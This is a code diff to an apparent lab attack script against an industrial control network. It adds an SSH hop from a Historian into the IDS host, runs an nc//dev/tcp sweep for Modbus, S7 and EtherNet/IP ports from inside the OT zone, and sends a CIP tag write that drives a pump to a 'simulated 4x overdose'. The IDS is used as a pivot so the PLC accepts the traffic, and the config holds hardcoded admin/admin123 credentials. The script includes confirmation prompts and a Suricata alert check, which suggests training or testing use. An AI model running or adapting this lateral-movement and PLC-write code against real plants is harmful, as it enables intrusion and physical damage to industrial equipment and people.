@@ -63,7 +63,10 @@ CFG = {
         "ip": "10.10.10.50",   # Cowrie — never target directly
     },
     "ids": {
-        "ip": "10.20.20.5",    # RPi5 IDS (Zeek/Suricata) — skip in OT sweep
+        "ip":       "10.20.20.5",   # RPi5 IDS (Zeek/Suricata) in OT zone
+        "username": "admin",         # update if different from Historian
+        "password": "admin123",      # update if different from Historian
+        "port":     22,
     },
     "plc": {
         "ip":           "10.20.20.100",
@@ -242,6 +245,39 @@ def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[st
     return stdout, stderr, exit_code
 
 
+def ssh_hop(
+    jump: paramiko.SSHClient,
+    target_ip: str,
+    target_port: int,
+    target_user: str,
+    target_pass: str,
+) -> paramiko.SSHClient:
+    """
+    Tunnel an SSH connection through an already-connected jump host.
+    Returns a fully authenticated SSHClient connected via the jump's transport.
+    This lets us reach hosts that only accept connections from the jump's IP.
+    """
+    transport = jump.get_transport()
+    dest_addr  = (target_ip,  target_port)
+    local_addr = (transport.getpeername()[0], 0)
+    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)
+
+    inner = paramiko.SSHClient()
+    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    inner.connect(
+        target_ip,
+        port=target_port,
+        username=target_user,
+        password=target_pass,
+        sock=chan,
+        timeout=15,
+        allow_agent=False,
+        look_for_keys=False,
+    )
+    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}")
+    return inner
+
+
 def confirm_phase(title: str) -> bool:
     console.print()  # blank line so prompt never lands mid-output
     return Confirm.ask(f"[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)
@@ -373,10 +409,12 @@ def auto_route(subnets: list[str]):
       5. If fails → delete route, try next candidate
       6. If all candidates fail → log error, skip subnet
     """
-    # Map each subnet to a real host to TCP-probe (not the network address)
+    # Map each subnet to a real host to TCP-probe (not the network address).
+    # For OT zone we probe the IDS (Linux box) on port 22 — the PLC drops probes
+    # from non-OT source IPs so it cannot be used to validate the route from Kali.
     SUBNET_PROBE = {
         CFG["nmap"]["idmz_subnet"]: (CFG["historian"]["ip"], 22),
-        "10.20.20.0/24":            (CFG["plc"]["ip"],       44818),
+        "10.20.20.0/24":            (CFG["ids"]["ip"],       22),
     }
 
     default_gw           = _find_gateway()
@@ -715,70 +753,82 @@ def phase3_ssh_bruteforce() -> PhaseResult:
 
 
 def phase4_ssh_pivot() -> PhaseResult:
-    phase_header(4, "SSH into Historian — Lateral Movement Recon")
+    phase_header(4, "SSH into Historian → Hop to IDS — OT Zone Recon")
     r = PhaseResult("SSH Pivot / OT Recon")
 
-    ip       = CFG["historian"]["ip"]
-    username = CFG["historian"]["username"]
-    password = CFG["historian"]["password"]
-    port     = CFG["historian"]["port"]
+    hist_ip   = CFG["historian"]["ip"]
+    hist_user = CFG["historian"]["username"]
+    hist_pass = CFG["historian"]["password"]
+    hist_port = CFG["historian"]["port"]
+
+    ids_ip    = CFG["ids"]["ip"]
+    ids_user  = CFG["ids"]["username"]
+    ids_pass  = CFG["ids"]["password"]
+    ids_port  = CFG["ids"]["port"]
+
+    plc_ip    = CFG["plc"]["ip"]
+    findings  = []
+    checks    = {"route": False, "ping": False, "syslog": False}
+
+    PORT_VENDOR = {
+        "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
+        "102":   "Siemens S7 (ISO-TSAP)",
+        "502":   "Modbus TCP Device",
+    }
+    SKIP_IPS = {ids_ip, "10.20.20.254"}
 
     try:
-        client = ssh_connect(hostname=ip, username=username, password=password, port=port)
+        # ── Step 1: land on Historian ────────────────────────────────────────
+        info(f"Connecting to Historian ({hist_ip})...")
+        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
+                                  password=hist_pass, port=hist_port)
 
-        plc_ip   = CFG["plc"]["ip"]
-        findings = []
-        checks   = {"route": False, "ping": False, "syslog": False}
-
-        # ── 1. OT syslog ────────────────────────────────────────────────────
+        # ── Step 2: OT syslog from Historian ────────────────────────────────
         console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
-        syslog_out, _, syslog_rc = ssh_run(client, "grep '10.20.20' /var/log/syslog | tail -20")
+        syslog_out, _, _ = ssh_run(hist_client, "grep '10.20.20' /var/log/syslog | tail -20")
         if syslog_out.strip():
             checks["syslog"] = True
             ok("OT zone syslog entries present")
         else:
-            warn("No OT syslog entries found — rsyslog forwarding may not be running")
+            warn("No OT syslog entries — rsyslog forwarding may not be running")
         findings.append(f"Syslog:\n{syslog_out}")
 
-        # ── 2. Route to OT zone ─────────────────────────────────────────────
-        console.print("\n[bold cyan]Route to OT zone[/bold cyan]")
-        route_out, _, route_rc = ssh_run(client, f"ip route get {plc_ip}")
-        if route_rc == 0 and plc_ip in route_out:
+        # ── Step 3: Confirm route to OT zone from Historian ─────────────────
+        console.print("\n[bold cyan]Route: Historian → OT zone[/bold cyan]")
+        route_out, _, route_rc = ssh_run(hist_client, f"ip route get {ids_ip}")
+        if route_rc == 0:
             checks["route"] = True
-            ok(f"Route to {plc_ip} exists")
+            ok(f"Route to OT zone ({ids_ip}) exists from Historian")
         else:
-            err(f"No route to {plc_ip} — OT zone may not be reachable from Historian")
+            err(f"No route to OT zone from Historian — FortiGate may be blocking")
         findings.append(f"Route:\n{route_out}")
 
-        # ── 3. OT Fingerprinting Sweep ──────────────────────────────────────
-        # Probe industrial ports across the full OT subnet from the Historian.
-        # No assumptions about vendor — let the open ports tell us what's there.
-        PORT_VENDOR = {
-            "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
-            "102":   "Siemens S7 (ISO-TSAP)",
-            "502":   "Modbus TCP Device",
-        }
-        SKIP_IPS = {CFG["ids"]["ip"], "10.20.20.254"}  # IDS + gateway
+        # ── Step 4: Hop from Historian into IDS (10.20.20.5) ────────────────
+        # The IDS lives inside the OT zone (10.20.20.x), so any probe it sends
+        # to the PLC will carry a 10.20.20.5 source IP — which the PLC accepts.
+        console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
+        info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")
+        ids_client = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
 
-        console.print("\n[bold cyan]OT Fingerprinting Sweep (nc multi-port)[/bold cyan]")
+        # ── Step 5: OT Fingerprinting Sweep — run FROM IDS ──────────────────
+        # Source IP = 10.20.20.5 → PLC accepts the probe.
+        console.print("\n[bold cyan]OT Fingerprinting Sweep (from IDS — OT zone source)[/bold cyan]")
         info("Probing ports 44818 (AB), 102 (Siemens), 502 (Modbus) across 10.20.20.1–254...")
 
-        # Check if nc is available on the Historian; fall back to /dev/tcp if not
-        nc_check, _, nc_rc = ssh_run(client, "which nc || which ncat || which netcat")
+        nc_check, _, nc_rc = ssh_run(ids_client, "which nc || which ncat || which netcat")
         has_nc = nc_rc == 0 and nc_check.strip()
 
         if has_nc:
             sweep_cmd = (
                 "for i in {1..254}; do "
                 "(for p in 102 502 44818; do "
-                "nc -z -w 1 10.20.20.$i $p 2>/dev/null "
+                "nc -z -w 2 10.20.20.$i $p 2>/dev/null "
                 "&& echo \"10.20.20.$i:$p\"; "
                 "done) & "
                 "done; wait"
             )
         else:
-            # bash /dev/tcp fallback — works without nc on most Linux systems
-            warn("nc not found on Historian — using bash /dev/tcp fallback")
+            warn("nc not found on IDS — using bash /dev/tcp fallback")
             sweep_cmd = (
                 "for i in {1..254}; do "
                 "(for p in 102 502 44818; do "
@@ -788,9 +838,8 @@ def phase4_ssh_pivot() -> PhaseResult:
                 "done; wait"
             )
 
-        sweep_out, _, _ = ssh_run(client, sweep_cmd, timeout=60)
+        sweep_out, _, _ = ssh_run(ids_client, sweep_cmd, timeout=90)
 
-        # Parse "IP:PORT" lines, filter out IDS and gateway
         discovered_devices: list[dict] = []
         for line in sweep_out.splitlines():
             line = line.strip()
@@ -807,30 +856,18 @@ def phase4_ssh_pivot() -> PhaseResult:
             vendor = PORT_VENDOR.get(d_port, f"Unknown (port {d_port})")
             discovered_devices.append({"ip": d_ip, "port": d_port, "vendor": vendor})
 
-        # ── Display results table ────────────────────────────────────────────
-        sweep_table = Table(
-            show_header=True, header_style="bold magenta", border_style="dim"
-        )
-        sweep_table.add_column("Discovered IP",   style="cyan",  width=18)
-        sweep_table.add_column("Open Port",        style="white", width=12)
+        sweep_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
+        sweep_table.add_column("Discovered IP",    style="cyan",  width=18)
+        sweep_table.add_column("Open Port",         style="white", width=12)
         sweep_table.add_column("Inferred PLC Type", style="green", width=40)
-
         for dev in discovered_devices:
             sweep_table.add_row(dev["ip"], dev["port"], dev["vendor"])
+        console.print(sweep_table)
 
-        if discovered_devices:
-            console.print(sweep_table)
-        else:
-            console.print(sweep_table)   # show empty table headers for clarity
-
-        # ── Update config with best candidate ───────────────────────────────
-        # Prefer EtherNet/IP (44818) → Modbus (502) → S7 (102)
         PORT_PRIORITY = ["44818", "502", "102"]
         best = None
         for preferred_port in PORT_PRIORITY:
-            best = next(
-                (d for d in discovered_devices if d["port"] == preferred_port), None
-            )
+            best = next((d for d in discovered_devices if d["port"] == preferred_port), None)
             if best:
                 break
 
@@ -840,7 +877,6 @@ def phase4_ssh_pivot() -> PhaseResult:
             CFG["plc"]["type"] = best["vendor"]
             plc_ip = best["ip"]
             checks["ping"] = True
-
             if best["ip"] != old_plc_ip:
                 console.print(Panel(
                     f"[bold white]Configured IP :[/bold white]  "
@@ -848,10 +884,9 @@ def phase4_ssh_pivot() -> PhaseResult:
                     f"[bold white]Discovered IP :[/bold white]  "
                     f"[bold green]{best['ip']}[/bold green]  port {best['port']}\n"
                     f"[bold white]Vendor        :[/bold white]  {best['vendor']}\n\n"
-                    f"[dim]CFG updated — Phase 5 will target {best['ip']}[/dim]",
+                    f"[dim]CFG updated — Phase 5 will CIP from IDS → {best['ip']}[/dim]",
                     title="[bold yellow] PLC IP AUTO-CORRECTED [/bold yellow]",
-                    border_style="yellow",
-                    expand=False,
+                    border_style="yellow", expand=False,
                 ))
             else:
                 ok(f"PLC confirmed: {best['ip']}  ({best['vendor']}  port {best['port']})")
@@ -861,9 +896,9 @@ def phase4_ssh_pivot() -> PhaseResult:
 
         findings.append(f"OT Sweep:\n{sweep_out}")
 
-        client.close()
+        ids_client.close()
+        hist_client.close()
 
-        # ── Determine overall phase result ───────────────────────────────────
         if checks["route"] and checks["ping"]:
             r.status  = "success"
             r.finding = (
@@ -871,20 +906,20 @@ def phase4_ssh_pivot() -> PhaseResult:
                 f"({CFG['plc'].get('type', 'unknown vendor')})"
             )
             ok(r.finding)
-        elif checks["route"] and not checks["ping"]:
+        elif not checks["ping"]:
             r.status  = "failed"
             r.finding = "No recognised industrial devices found on the OT subnet"
             err(r.finding)
-        elif not checks["route"]:
+        else:
             r.status  = "failed"
-            r.finding = f"No route from Historian to OT zone — pivot blocked"
+            r.finding = "No route from Historian to OT zone"
             err(r.finding)
 
         r.output = "\n".join(findings)
 
-    except paramiko.AuthenticationException:
+    except paramiko.AuthenticationException as e:
         r.status  = "failed"
-        r.finding = f"SSH auth failed for {username}@{ip} — update CFG credentials"
+        r.finding = f"SSH auth failed — {e} — check CFG credentials"
         err(r.finding)
     except Exception as e:
         r.status  = "failed"
@@ -903,22 +938,29 @@ def phase5_plc_attack() -> PhaseResult:
     safe_val = CFG["plc"]["safe_value"]
     atk_val  = CFG["plc"]["attack_value"]
 
-    hist_ip       = CFG["historian"]["ip"]
-    hist_port     = CFG["historian"]["port"]
-    hist_username = CFG["historian"]["username"]
-    hist_password = CFG["historian"]["password"]
+    hist_ip   = CFG["historian"]["ip"]
+    hist_port = CFG["historian"]["port"]
+    hist_user = CFG["historian"]["username"]
+    hist_pass = CFG["historian"]["password"]
+
+    ids_ip   = CFG["ids"]["ip"]
+    ids_port = CFG["ids"]["port"]
+    ids_user = CFG["ids"]["username"]
+    ids_pass = CFG["ids"]["password"]
 
     warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
+    warn(f"CIP traffic will originate from IDS ({ids_ip}) — inside OT zone, PLC will accept it.")
     warn("MasterFlex pump will physically change behavior.")
 
+    console.print()
     if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
         r.status  = "skipped"
         r.finding = "Skipped by operator"
         return r
 
-    # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
-    # Try common venv paths; fall back to system python3 if none found.
-    # bash -c wrapper lets us chain source + heredoc in a single exec_command.
+    # The CIP payload runs on the IDS (10.20.20.5) so the source IP is inside
+    # the OT zone — the PLC accepts connections from 10.20.20.x only.
+    # Route: Kali -SSH-> Historian -SSH hop-> IDS -CIP/44818-> PLC
     payload = (
         "bash -c '"
         "source ~/attack_script/venv/bin/activate 2>/dev/null || "
@@ -936,15 +978,18 @@ def phase5_plc_attack() -> PhaseResult:
     )
 
     try:
-        client = ssh_connect(
-            hostname=hist_ip,
-            username=hist_username,
-            password=hist_password,
-            port=hist_port,
-        )
-        ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
-        stdout, stderr, _ = ssh_run(client, payload, timeout=30)
-        client.close()
+        info(f"Connecting Kali → Historian ({hist_ip})...")
+        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
+                                  password=hist_pass, port=hist_port)
+
+        info(f"Hopping Historian → IDS ({ids_ip})...")
+        ids_client = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
+
+        ok(f"CIP Write path: Kali → Historian ({hist_ip}) → IDS ({ids_ip}) → PLC ({plc_ip})")
+        stdout, stderr, _ = ssh_run(ids_client, payload, timeout=30)
+
+        ids_client.close()
+        hist_client.close()
 
         if f"After: {atk_val}" in stdout:
             r.status  = "success"
@@ -961,9 +1006,9 @@ def phase5_plc_attack() -> PhaseResult:
 
         r.output = stdout + stderr
 
-    except paramiko.AuthenticationException:
+    except paramiko.AuthenticationException as e:
         r.status  = "failed"
-        r.finding = f"SSH auth failed for {hist_username}@{hist_ip}"
+        r.finding = f"SSH auth failed — {e}"
         err(r.finding)
     except Exception as e:
         r.status  = "failed"
@@ -977,23 +1022,27 @@ def phase6_defense_check() -> PhaseResult:
     phase_header(6, "Defense Validation (Secure State)")
     r = PhaseResult("Defense Validation")
 
-    ids_ip       = CFG["ids"]["ip"]
-    ids_username = CFG["historian"]["username"]
-    ids_password = CFG["historian"]["password"]
-    ids_port     = CFG["historian"]["port"]
-    ids_cmd      = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"
+    hist_ip   = CFG["historian"]["ip"]
+    hist_port = CFG["historian"]["port"]
+    hist_user = CFG["historian"]["username"]
+    hist_pass = CFG["historian"]["password"]
 
-    info(f"Checking Suricata alerts on IDS ({ids_ip})...")
+    ids_ip   = CFG["ids"]["ip"]
+    ids_port = CFG["ids"]["port"]
+    ids_user = CFG["ids"]["username"]
+    ids_pass = CFG["ids"]["password"]
+    ids_cmd  = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"
+
+    info(f"Checking Suricata alerts on IDS ({ids_ip}) via Historian hop...")
 
     try:
-        client = ssh_connect(
-            hostname=ids_ip,
-            username=ids_username,
-            password=ids_password,
-            port=ids_port,
-        )
-        stdout, _, _ = ssh_run(client, ids_cmd)
-        client.close()
+        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
+                                  password=hist_pass, port=hist_port)
+        ids_client  = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
+
+        stdout, _, _ = ssh_run(ids_client, ids_cmd)
+        ids_client.close()
+        hist_client.close()
 
         if stdout.strip():
             ok("Suricata CIP alert triggered:")
@@ -1007,9 +1056,9 @@ def phase6_defense_check() -> PhaseResult:
 
         r.output = stdout
 
-    except paramiko.AuthenticationException:
+    except paramiko.AuthenticationException as e:
         r.status  = "failed"
-        r.finding = f"SSH auth failed for {ids_username}@{ids_ip}"
+        r.finding = f"SSH auth failed — {e}"
         err(r.finding)
     except Exception as e:
         r.status  = "failed"
